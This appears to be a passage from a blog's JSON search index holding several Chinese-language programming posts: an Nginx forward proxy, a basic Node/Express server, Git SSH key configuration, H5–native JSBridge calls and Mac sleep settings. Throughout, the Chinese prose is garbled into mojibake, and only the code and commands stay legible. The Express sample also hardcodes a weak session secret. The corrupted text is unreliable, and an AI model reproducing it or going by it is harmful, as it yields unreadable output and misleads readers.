çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨Nginxæ¥å®ç°æ­£å‘ä»£ç†ï¼Œä½†æ˜¯ç›®å‰Nginxæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸æ”¯æŒHTTPSï¼Œè™½ç„¶æˆ‘ç™¾åº¦åˆ°è¿‡é…ç½®HTTPSçš„æ­£å‘ä»£ç†ï¼Œä½†æ˜¯åˆ°æœ€åå‘ç°è¿˜æ˜¯ä»£ç†ä¸äº†ï¼Œå½“ç„¶å¯èƒ½æ˜¯æˆ‘é…ç½®çš„ä¸å¯¹ï¼Œæ‰€ä»¥ä¹Ÿå¸Œæœ›æœ‰çŸ¥é“æ­£ç¡®æ–¹æ³•çš„åŒå¿—ä»¬ç•™è¨€è¯´æ˜ä¸€ä¸‹\nresolver 114.114.114.114 8.8.8.8; server { resolver_timeout 5s; listen 81; access_log e:wwwrootproxy.access.log; error_log e:wwwrootproxy.error.log; location / { proxy_pass http://$host$request_uri; } } resolveræ˜¯é…ç½®æ­£å‘ä»£ç†çš„DNSæœåŠ¡å™¨ï¼Œlisten æ˜¯æ­£å‘ä»£ç†çš„ç«¯å£ï¼Œé…ç½®å¥½äº†å°±å¯ä»¥åœ¨ieä¸Šé¢æˆ–è€…å…¶ä»–ä»£ç†æ’ä»¶ä¸Šé¢ä½¿ç”¨æœåŠ¡å™¨ip+ç«¯å£å·è¿›è¡Œä»£ç†äº†\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-whatcando/","summary":"\u003cp\u003enode ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\u003c/p\u003e","title":"Nginx: èƒ½å¤Ÿåšä»€ä¹ˆ"},{"content":"node ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\nNode: æœ€ç®€å•çš„node server é¡¹ç›®ç»“æ„ ä¸»è¦æ–‡ä»¶:\nbin/www package.json ç¡®å®šå¹¶å®‰è£…node $ node -v bin/www var http = require(\u0026#39;http\u0026#39;); var port = 8000; /** * var app = require(\u0026#39;../app\u0026#39;); * var server = http.createServer(app); */ var data = { key: \u0026#39;hello\u0026#39;, value: \u0026#39;world\u0026#39;}; var server = http.createServer(function(request,response){ response.writeHead(200,{ \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; }); response.write(\u0026#39;Hello World -- 0\u0026#39;); response.end(JSON.stringify(data)); }); server.listen(port); console.log(\u0026#39;Server running on port 8000\u0026#39;); package.json å¯ä»¥å‚è€ƒé…ç½®scripts\n{ \u0026#34;name\u0026#34;: \u0026#34;node-server\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A project that introduces simple node services\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node ./bin/www\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;lianpf\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; } å¦‚æœä¸æƒ³å¢åŠ æ›´å¤šé…ç½®, å¯ä»¥å‘½ä»¤è¡Œ node ./bin/www ä¸ç”¨é…ç½®package.json\nå¯åŠ¨ $ npm run start //å¯åŠ¨server æµè§ˆå™¨ç›´æ¥è®¿é—® localhost:8000 , å¯ä»¥çœ‹åˆ°responseè¿”å›æ•°æ®\næ‹“å±• æ³¨æ„çœ‹é¡¹ç›®ç»“æ„çš„åŒå­¦è‚¯å®šæ³¨æ„åˆ°äº†æ²¡æœ‰æåˆ°app.jsæ–‡ä»¶, ä»¥åŠbin/www æ–‡ä»¶é‡Œæ³¨é‡Šçš„appç›¸å…³çš„ä»£ç , è¿™é‡Œè¦è®²çš„æ˜¯app.jsæ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶, å¯ä»¥é…ç½®routerç­‰ç›¸å…³ä¿¡æ¯ã€‚ç„¶åå¯åŠ¨node server, æä¾›æ¥å£æœåŠ¡ã€‚ è¿™é‡Œè´´ä¸‹æˆ‘ä¹‹å‰é¡¹ç›®app.jsçš„é…ç½®, æœ‰å…´è¶£çš„åŒå­¦è‡ªå·±å‚è€ƒæ‹“å±•\nvar express = require(\u0026#39;express\u0026#39;); var session=require(\u0026#39;express-session\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var favicon = require(\u0026#39;serve-favicon\u0026#39;); var logger = require(\u0026#39;morgan\u0026#39;); var cookieParser = require(\u0026#39;cookie-parser\u0026#39;); var bodyParser = require(\u0026#39;body-parser\u0026#39;); var routes = require(\u0026#39;./routes/index\u0026#39;); var users = require(\u0026#39;./routes/users\u0026#39;); var connect_more=require(\u0026#39;./routes/connect_more\u0026#39;); var find = require(\u0026#39;./routes/find\u0026#39;); var hero = require(\u0026#39;./routes/hero\u0026#39;); var about_me = require(\u0026#39;./routes/about_me\u0026#39;); var app = express(); //app.setè®¾ç½®view engine ä¸ºejs //appè¯·æ±‚indexï¼Œusers var connect=require(\u0026#39;connect\u0026#39;); //app.useè®¾ç½®è·¯ç”±ï¼Œ/åˆ†é…ç»™routesï¼Œ/usersåˆ†é…ç»™users // view engine setup app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); // uncomment after placing your favicon in /public //app.use(favicon(path.join(__dirname, \u0026#39;public\u0026#39;, \u0026#39;favicon.ico\u0026#39;))); app.use(logger(\u0026#39;dev\u0026#39;)); app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); //app.useè®¾ç½®sessionå›è¯ï¼Œå•ä½ä¸ºæ¯«ç§’å…¨å±€å˜é‡ã€‚ //session æ—¶é•¿ä¸º30åˆ†é’Ÿ,è¿™ä¸ªæ˜¯ä»¥æ¯«ç§’ä¸ºå•ä½,è¿™æ ·æˆ‘ä»¬å°±å»ºç«‹ä¸€ä¸ªsessionçš„ä¼šè¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå…¨å±€çš„è®¾ç½® app.use(session({ secret: \u0026#39;joke\u0026#39;, key: \u0026#39;joke_key\u0026#39;,cookie: {maxAge: 1800000 }})); app.use(\u0026#39;/\u0026#39;, routes); app.use(\u0026#39;/users\u0026#39;, users); app.use(\u0026#39;/connect_more\u0026#39;,connect_more); app.use(\u0026#39;/find\u0026#39;,find); app.use(\u0026#39;/hero\u0026#39;,hero); app.use(\u0026#39;/about_me\u0026#39;,about_me); // catch 404 and forward to error handler app.use(function(req, res, next) { var err = new Error(\u0026#39;Not Found\u0026#39;); err.status = 404; next(err); }); // error handlers // development error handler // will print stacktrace if (app.get(\u0026#39;env\u0026#39;) === \u0026#39;development\u0026#39;) { app.use(function(err, req, res, next) { res.status(err.status || 500); res.render(\u0026#39;error\u0026#39;, { message: err.message, error: err }); }); } // production error handler // no stacktraces leaked to user app.use(function(err, req, res, next) { res.status(err.status || 500); res.render(\u0026#39;error\u0026#39;, { message: err.message, error: {} }); }); Date.prototype.Format = function (fmt) { //author: meizz var o = { \u0026#34;M+\u0026#34;: this.getMonth() + 1, //æœˆä»½ \u0026#34;d+\u0026#34;: this.getDate(), //æ—¥ \u0026#34;h+\u0026#34;: this.getHours(), //å°æ—¶ \u0026#34;m+\u0026#34;: this.getMinutes(), //åˆ† \u0026#34;s+\u0026#34;: this.getSeconds(), //ç§’ \u0026#34;q+\u0026#34;: Math.floor((this.getMonth() + 3) / 3), //å­£åº¦ \u0026#34;S\u0026#34;: this.getMilliseconds() //æ¯«ç§’ }; if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + \u0026#34;\u0026#34;).substr(4 - RegExp.$1.length)); for (var k in o) if (new RegExp(\u0026#34;(\u0026#34; + k + \u0026#34;)\u0026#34;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((\u0026#34;00\u0026#34; + o[k]).substr((\u0026#34;\u0026#34; + o[k]).length))); return fmt; }; module.exports = app; æ³¨ é¡¹ç›®githubåœ°å€ https://github.com/Wayshower/node-server\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-simpleserver/","summary":"\u003cp\u003enode ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„\u0026quot;jsç‰ˆ\u0026quot;åç«¯å¼€å‘è¯­è¨€ä¹‹ä¸€ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡å¼€å‘ï¼Œè¿˜æ˜¯è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\u003c/p\u003e","title":"Node: æœ€ç®€å•çš„node server"},{"content":"git ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\ngit ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯æœ‰çš„å°ä¼™ä¼´å‘ç°æ¯æ¬¡ä½¿ç”¨ git push ç­‰æ“ä½œæ—¶éƒ½è¦è¾“å…¥å¯†ç ï¼Œå®åœ¨æ˜¯éº»çƒ¦ã€‚è¿™é‡Œå¯¹ä½¿ç”¨ SSH ä¸ HTTPS ä¸¤ç§é€šè®¯åè®®ä»‹ç»ä¸€ä¸‹å…å¯†ç é…ç½®\nä¸€ã€æœ¬åœ°GitåŸºæœ¬ä¿¡æ¯é…ç½® æœ¬åœ°Gitç”¨æˆ·åã€é‚®ç®±ç­‰åŸºæœ¬ä¿¡æ¯é…ç½®\ni. æŸ¥çœ‹\néªŒè¯ã€å½“å‰æœ¬åœ°ã€æ˜¯å¦å·²é…ç½®è´¦å·ä¿¡æ¯\n$ git config --list # æŸ¥çœ‹æ‰€æœ‰ $ git config --global --list # æŸ¥çœ‹å½“å‰ç”¨æˆ·(global)é…ç½® $ git config --system --list # æŸ¥çœ‹ç³»ç»Ÿconfig $ git config --local --list # æŸ¥çœ‹å½“å‰ä»“åº“é…ç½®ä¿¡æ¯ # æŸ¥çœ‹æŒ‡å®šä¿¡æ¯ $ git config user.name $ git config user.email ii. å¢åˆ æ”¹\nç¬¬ä¸€æ¬¡é…ç½®ï¼Œéœ€è¦è®¾ç½®Gitçš„user nameå’Œemail\n# æ–°å¢æˆ–è¦†ç›– $ git config --global user.name \u0026#34;lian\u0026#34; # you name $ git config --global user.email \u0026#34;lian@foxmail.com\u0026#34; # you email # æ›¿æ¢ $ git config --global --replace-all user.name \u0026#34;yourName\u0026#34; $ git config --global --replace-all user.email \u0026#34;your@email.com\u0026#34; # åˆ é™¤ $ git config --global --unset user.name \u0026#34;yourName\u0026#34; $ git config --global --unset user.email \u0026#34;your@email.com\u0026#34; äºŒã€ssh keyå’Œhttpså·®å¼‚ cloneé¡¹ç›®: ä½¿ç”¨sshæ–¹å¼æ—¶ï¼Œé¦–å…ˆä½ å¿…é¡»æ˜¯è¯¥é¡¹ç›®çš„ç®¡ç†è€…æˆ–æ‹¥æœ‰è€…ï¼Œå¹¶ä¸”éœ€è¦é…ç½®ä¸ªäººçš„ssh keyã€‚è€Œå¯¹äºä½¿ç”¨httpsæ–¹å¼æ¥è®²ï¼Œå°±æ²¡æœ‰è¿™äº›è¦æ±‚ã€‚ push:åœ¨ä½¿ç”¨sshæ–¹å¼æ—¶ï¼Œæ˜¯ä¸éœ€è¦éªŒè¯ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœä½ åœ¨é…ç½®ssh keyæ—¶è®¾ç½®äº†å¯†ç ï¼Œåˆ™éœ€è¦éªŒè¯å¯†ç ã€‚è€Œå¯¹äºä½¿ç”¨httpsæ–¹å¼æ¥è®²ï¼Œæ¯æ¬¡pushéƒ½éœ€è¦éªŒè¯ç”¨æˆ·åå’Œå¯†ç ã€‚ ä¸‰ã€é…ç½®ssh key 1. å•ä¸ªssh keyç”ŸæˆåŠé…ç½® 1.1 ç”Ÿæˆå¯†é’¥ ssh-keygenç¨‹åºåœ¨Linux/Macç³»ç»Ÿä¸Šç”±SSHåŒ…æä¾›ï¼Œè€Œåœ¨Windowsä¸Šåˆ™åŒ…å«åœ¨MSysGitåŒ…é‡Œ\n$ ssh-keygen -t rsa -C \u0026#34;lian@foxmail.com\u0026#34; ç›´æ¥Enterï¼Œä¼šæç¤ºä½ è¾“å…¥å¯†ç ï¼Œå¦‚ä¸‹(å¯ä¸è¾“ï¼Œå»ºè®®è¾“å…¥ï¼Œå®‰å…¨æ€§æ›´é«˜)ï¼š\nEnter same passphrase again: [Type passphrase again] ã€æœ¬åœ°çš„å¯†é’¥å¯¹ã€ç”Ÿæˆå®Œæˆæç¤ºï¼š\nYour public key has been saved in /home/you/.ssh/id_rsa.pub. The key fingerprint is: # 01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db lian@foxmail.com å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼šid_rsaå’Œid_rsa.pubã€‚ä¸æ˜¯ç¬¬ä¸€æ¬¡ï¼Œåˆ™é€‰æ‹©overwrite\n1.2 æ£€æŸ¥æ˜¯å¦å­˜åœ¨ssh key $ cd ~/.ssh $ cd ~/.ssh \u0026amp;\u0026amp; ls # è¿›å…¥ä¸”æŸ¥çœ‹ id_rsaï¼šå¯†é’¥ id_rsa.pubï¼šæœ‰.pubåç¼€çš„æ–‡ä»¶å°±æ˜¯å…¬é’¥ï¼Œå¦ä¸€ä¸ªæ–‡ä»¶åˆ™æ˜¯ã€‚ 1.3 æ·»åŠ å…¬é’¥åˆ°è¿œç¨‹ä»“åº“ï¼ˆgithubã€gitLab ç­‰) æŸ¥çœ‹å…¬é’¥\n$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAAAQC0X6L1zLL4VHuvGb8aJH3ippTozmReSUzgntvk434aJ ... 6J0GFlBVQeTE/IGqhMS5PMln3 lian@foxmail.com æ·»åŠ å…¬é’¥åˆ°è¿œç¨‹ä»“åº“ ä»¥gitHubä¸ºä¾‹ï¼Œç™»å½•è¿›å…¥ä¸ªäººä¸­å¿ƒï¼Œæ‰“å¼€Settings -\u0026gt; SSH Keysï¼Œå¤åˆ¶å…¬é’¥å†…å®¹åˆ°ã€keyæ–‡æœ¬åŸŸã€å†…\nå¦‚æœå…¬é’¥å¤åˆ¶æ­£ç¡®, ã€titleåŸŸã€ä¼šè‡ªåŠ¨å°†you emailä»£å…¥, ä¾¿äºæ ‡è¯†ï¼Œä½ å¯ä»¥ä¿®æ”¹ä¸ºå…¶ä»–çš„åå­—\nç”¨sshå‘½ä»¤åˆ†åˆ«æµ‹è¯•\nssh -T git@github.com 2. å¤šä¸ªSSH-Keyé…ç½® å½“æœ‰å¤šä¸ªã€gitè´¦å·ã€æ—¶ï¼Œæ¯”å¦‚ï¼šä¸€ä¸ªgitLabï¼Œç”¨äºå…¬å¸å†…çš„å·¥ä½œå¼€å‘ã€‚ä¸€ä¸ªgithubï¼Œç”¨äºä¸ªäººçš„ä¸€äº›å¼€å‘æ–¹å‘ã€‚\n2.1 ç”Ÿæˆssh key # ç”Ÿæˆä¸€ä¸ªgitlabç”¨çš„SSH-Key $ ssh-keygen -t rsa -C \u0026#39;xxxxx@company.com\u0026#39; -f ~/.ssh/id_rsa_gitlab # ç”Ÿæˆä¸€ä¸ªgithubç”¨çš„SSH-Key $ ssh-keygen -t rsa -C \u0026#39;xxxxx@qq.com\u0026#39; -f ~/.ssh/id_rsa_github 2.2 ç”Ÿæˆconfigé…ç½®æ–‡ä»¶ ~/.sshç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªconfigæ–‡ä»¶\n$ cd ~/.ssh # ä¸º.sshç›®å½•è®¾ç½®æƒé™ .ssh $ chmod 600 ~/.ssh/config configæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š\nHostå’ŒHostNameå¡«å†™gitæœåŠ¡å™¨çš„åŸŸå IdentityFileæŒ‡å®šç§é’¥çš„è·¯å¾„ # gitLab Host gitLab.com HostName gitLab.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa_gitlab # github Host github.com HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa_github 2.3 ç”¨sshå‘½ä»¤åˆ†åˆ«æµ‹è¯• $ ssh -T git@gitLab.com $ ssh -T git@github.com ä»¥gitHubä¸ºä¾‹ï¼ŒæˆåŠŸè¿”å›å¦‚ä¸‹å†…å®¹ï¼š\n$ ssh -T git@github.com Hi lianpf! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. å››ã€HTTPS é€šä¿¡åè®® å¾…æ›´æ–°\u0026hellip;g\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/gitconfigs-ssh-https/","summary":"\u003cp\u003egit ä½œä¸ºå½“å‰æœ€å—æ¬¢è¿çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œä½¿ç”¨æ˜¯å¾ˆé¢‘ç¹çš„ã€‚ä½†æ˜¯\u0026hellip;\u003c/p\u003e","title":"Git: ssh keyã€https é…ç½®åŠç”¨æˆ·åã€é‚®ç®±åŸºæœ¬ä¿¡æ¯é…ç½®"},{"content":"H5å’Œnativeåˆ©ç”¨JSBridgeäº¤äº’ï¼Œå…¶ä¸­æ¶‰åŠåˆ°äº†ä¸€äº›å’Œiosäº¤äº’çš„callHandleræ¡†æ¶ï¼ŒWebViewJavascriptBridgeç›¸å…³çš„åŸç†è¿˜å¾…è¡¥å……\u0026hellip;\nä¸€.åŸºæœ¬ç”¨æ³•ä½¿ç”¨ bridgeæ–‡ä»¶ bridgeæ–‡ä»¶æ˜¯åŸç”Ÿè°ƒç”¨nativeçš„åŸºç¡€ï¼Œå¤§è‡´éœ€è¦è¿™ä¹ˆå‡ æ­¥å®Œæˆ: 1.å»ºç«‹AppClientå¯¹è±¡\nfunction AppClient(appObj, isAndroid) { this.appObj = appObj; this.isAndroid = isAndroid; }; 2.å»ºç«‹jsæ–‡ä»¶è°ƒç”¨nativeçš„æ–¹æ³•\nAppClient.prototype.closePage = function() { if (this.isAndroid) { this.appObj.closePageAction(); } else { this.appObj.callHandler(\u0026#34;closePageAction\u0026#34;); } } æ³¨ï¼šclosePage()å°±æ˜¯jsæ–‡ä»¶è°ƒç”¨nativeå…³é—­é¡µé¢çš„æ–¹æ³•ï¼Œ\u0026ldquo;closePageAction\u0026quot;æ˜¯nativeç«¯æš´éœ²ç»™jsç«¯å…³é—­ é¡µé¢çš„æ“ä½œã€‚\njsè°ƒç”¨æ–‡ä»¶ 1.init AppClientå¯¹è±¡\nif(window.android) { appClient = new AppClient(window.android, true); // æ­¤å¤„å¯ä»¥è°ƒç”¨ä¸€äº›initçš„æ–¹æ³• } else { function setupWebViewJavascriptBridge(callback) { if (window.WebViewJavascriptBridge) { return callback(WebViewJavascriptBridge); } if (window.WVJBCallbacks) { return window.WVJBCallbacks.push(callback); } window.WVJBCallbacks = [callback]; var WVJBIframe = document.createElement(\u0026#39;iframe\u0026#39;); WVJBIframe.style.display = \u0026#39;none\u0026#39;; WVJBIframe.src = \u0026#39;https://__bridge_loaded__\u0026#39;; document.documentElement.appendChild(WVJBIframe); setTimeout(function() { document.documentElement.removeChild(WVJBIframe) }, 0) } setupWebViewJavascriptBridge(function(bridge) { appClient = new AppClient(bridge, false); // æ­¤å¤„å¯ä»¥è°ƒç”¨ä¸€äº›initçš„æ–¹æ³• }); } 2.è°ƒç”¨ï¼Œä¾æ—§closePage()ä¸ºä¾‹ï¼š\nappClient.closePage(); äºŒ.é‡ç‚¹ æ•°æ® 1.nativeå­˜åœ¨å¤šçº¿ç¨‹ï¼Œæ‰€ä»¥åœ¨jsç«¯h5é¡µé¢åœ¨è·å–æ¥å£æ•°æ®æ—¶ï¼Œéœ€è¦è®¾ç½®ajaxå¼‚æ­¥(ä»¥jQueryä¸ºä¾‹ï¼šasyncï¼štrue) 2.jså®ç°å¼‚æ­¥çš„å‡ ç§é€”å¾„ï¼š (1) åœ¨å¼‚æ­¥è·å–æ•°æ®æˆåŠŸä¹‹åï¼Œå†å»ç»§ç»­ä¸‹ä¸€æ­¥æ“ä½œï¼Œä»¥jQueryä¸ºä¾‹ï¼š åœ¨successå›è°ƒå‡½æ•°é‡Œé¢ï¼Œæ‰§è¡Œæ¥ä¸‹æ¥çš„æ“ä½œ\n$.ajax({ headers: { Accept: \u0026#34;application/json; charset=utf-8\u0026#34;, basicParams: JSON.stringify(appData), }, url:staticUrl + url, type:\u0026#39;POST\u0026#39;, dataType:\u0026#34;json\u0026#34;, data: params, async:true, cache:false, contentType:\u0026#39;application/json\u0026#39;, processData:false, success:function(data){ // ä½ çš„ä¸‹ä¸€æ­¥æ“ä½œ }, error:function(data){ console.log(\u0026#34;---å‡ºç°é”™è¯¯---\u0026#34;+ JSON.stringify(data)); } }); (2)ES6åŸç”Ÿæä¾›çš„Promiseå¯¹è±¡ï¼Œå°†å¼‚æ­¥æ“ä½œä»¥åŒæ­¥æ“ä½œçš„æµç¨‹è¡¨è¾¾å‡ºæ¥\nvar promise = new Promise(function(resolve, reject) { if (/* å¼‚æ­¥æ“ä½œæˆåŠŸ */){ resolve(value); } else { reject(error); } }); promise.then(function(value) { // success ä½ çš„ä¸‹ä¸€æ­¥æ“ä½œ }, function(value) { // failure }); jsç«¯è°ƒç”¨nativeéœ€è¦nativeå›ä¼ æ•°æ® 1.å®šä¹‰nativeå›è°ƒjsç«¯çš„å‡½æ•° (1)invokeJsPassCompanyCodeAndName()å³nativeè°ƒç”¨jsçš„å‡½æ•°ï¼Œå¿…é¡»æ”¾åœ¨windowå…¨å±€å¯¹è±¡ä¸‹, å¦åˆ™nativeå¯èƒ½ä¼šè°ƒä¸åˆ°ï¼› (2)iosç«¯åˆ©ç”¨callHandleræ¡†æ¶å›ä¼ çš„æ•°æ®åªèƒ½æ˜¯jsonå¯¹è±¡çš„å½¢å¼\nwindow.invokeJsPassCompanyCodeAndName = function(_params) { companyCode = _params.companyCode; companyName = _params.companyName; var jsonStr = \u0026#34;\u0026#34;; getSign(jsonStr); } 2.jsç«¯è°ƒç”¨native\nappClient.getSignedParams(\u0026#34;jsDataAction\u0026#34;, jsDataAction, ajaxRequestStr); æ³¨ï¼šä¸‰ä¸ªå‚æ•°ï¼ˆcallbackName, callback, paramsï¼‰å›è°ƒå‡½æ•°åç§°ï¼Œå›è°ƒå‡½æ•°ï¼Œç»™nativeä¼ çš„å‚æ•°\n3.bridgeæ–‡ä»¶\nAppClient.prototype.getSignedParams = function (callbackName, callback, jsonStr) { var dataParams = \u0026#34;\u0026#34;; if(isJson(jsonStr)){ dataParams = JSON.parse(jsonStr); } var iOSData = { from: \u0026#39;H5\u0026#39;, params: dataParams }; if (this.isAndroid) { this.appObj.getSignedParamsAction(\u0026#39;H5\u0026#39;, jsonStr); } else { this.appObj.callHandler(\u0026#34;getSignedParamsAction\u0026#34;, iOSData, callback); } }; æ³¨ï¼šåˆ©ç”¨callHandlerç»™nativeä¼ å‚æ•°æ—¶ï¼ŒiOSDataå¿…é¡»æ˜¯ä¸€ä¸ªjsonå¯¹è±¡\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/frontend-develop/mobile-native-bridge/","summary":"\u003cp\u003eH5å’Œnativeåˆ©ç”¨JSBridgeäº¤äº’ï¼Œå…¶ä¸­æ¶‰åŠåˆ°äº†ä¸€äº›å’Œiosäº¤äº’çš„callHandleræ¡†æ¶ï¼ŒWebViewJavascriptBridgeç›¸å…³çš„åŸç†è¿˜å¾…è¡¥å……\u0026hellip;\u003c/p\u003e","title":"ç§»åŠ¨ç«¯: H5å’Œnativeåˆ©ç”¨JsBridgeäº¤äº’"},{"content":"ä½¿ç”¨Macè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜è®°å½•\u0026hellip;\nä¸€ã€ç³»ç»Ÿé…ç½® 1.åˆä¸Šç›–å­ä¸ä¼‘çœ çš„é—®é¢˜ ç¡¬ä»¶ï¼šMacBook Pro (13-inch, 2017, Four Thunderbolt 3 Ports) ç³»ç»Ÿç‰ˆæœ¬ï¼šmacOS High Sierra 10.13.6 é—®é¢˜ï¼šå‡çº§äº†æ–°ç³»ç»ŸSierraåå‡ºç°â€åˆä¸Šç›–å­ç«Ÿæ²¡æœ‰ä¼‘çœ ï¼Œç¬¬äºŒå¤©æ—©ä¸Šèµ·æ¥å‘ç°æ‰äº†50%å¤šçš„ç”µï¼Œè€Œä¸”æ¸©åº¦å ªæ¯”æš–å®å®â€\nè§£å†³ï¼š\nç”µæºå‚æ•°ä¸åŒ¹é…å¯¼è‡´ æ‰“å¼€terminalç»ˆç«¯ï¼Œè¾“å…¥pmset -g customæ£€æŸ¥ç”µæºå‚æ•°\nåˆ†åˆ«æ£€æŸ¥ Battery Powerç”µæ±  å’Œ AC Powerç”µæºé€‚é…å™¨å‚æ•°ä¸‹çš„ displaysleepï¼Œsleepï¼Œå’Œdisksleepå‚æ•°ï¼Œè¦æ±‚æ—¶é—´çš„é•¿åº¦ï¼šsleep\u0026gt;=displaysleep\u0026gt;=disksleepã€‚è‹¥æ²¡æœ‰éµå¾ªæ­¤è§„åˆ™ï¼Œä¸‰ä¸ªå‚æ•°ä¹‹é—´çš„æ—¶é—´å†²çªä¼šå¯¼è‡´macåœ¨ç”µæ± çŠ¶æ€ä¸‹æ²¡æœ‰æ­£å¸¸è¿›å…¥ä¼‘çœ \ndisplaysleep: Macé—²ç½®å¤šé•¿æ—¶é—´åè¿›å…¥æ˜¾ç¤ºå™¨ç¡çœ ï¼Œå•ä½æ˜¯åˆ†é’Ÿï¼Œè¿™ä¸ªæ—¶é—´ä¸èƒ½é•¿äºsleepä¸‹è®¾ç½®çš„æ—¶é—´ sleep: Macé—²ç½®å¤šé•¿æ—¶é—´åè¿›å…¥ç¡çœ ï¼Œè¿™ä¸ªç³»ç»Ÿåå¥½è®¾ç½®é‡Œä¹Ÿæœ‰ï¼Œå•ä½æ˜¯åˆ†é’Ÿ disksleep: Macé—²ç½®å¤šé•¿æ—¶é—´åå…³é—­ç¡¬ç›˜ã€‚è¿™ä¸ªé…ç½®éœ€è¦åœ¨ç³»ç»Ÿåå¥½é‡Œå‹¾é€‰â€œå¦‚æœå¯èƒ½ï¼Œä½¿ç¡¬ç›˜è¿›å…¥ç¡çœ â€ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ ¹æ®sleepçš„æ—¶é—´è®¾ä¸€ä¸ªåˆé€‚çš„æ—¶é—´ã€‚å•ä½æ˜¯ç§’ï¼Œè¿™ä¸ªæ—¶é—´ä¸èƒ½é•¿äºsleepä¸‹è®¾ç½®çš„æ—¶é—´ ä¿®æ”¹ä»¥ä¸Šå‚æ•°ï¼Œåˆ™éœ€è¦ï¼š\nâ€œç³»ç»Ÿåå¥½è®¾ç½®-\u0026gt;èŠ‚èƒ½-\u0026gt;ç”µæ± â€å»ä¿®æ”¹Battery Powerç”µæ± ä¸‹çš„å‚æ•° â€œç³»ç»Ÿåå¥½è®¾ç½®-\u0026gt;èŠ‚èƒ½-\u0026gt;ç”µæºé€‚é…å™¨â€å»ä¿®æ”¹AC Powerç”µæºé€‚é…å™¨ä¸‹çš„å‚æ•° 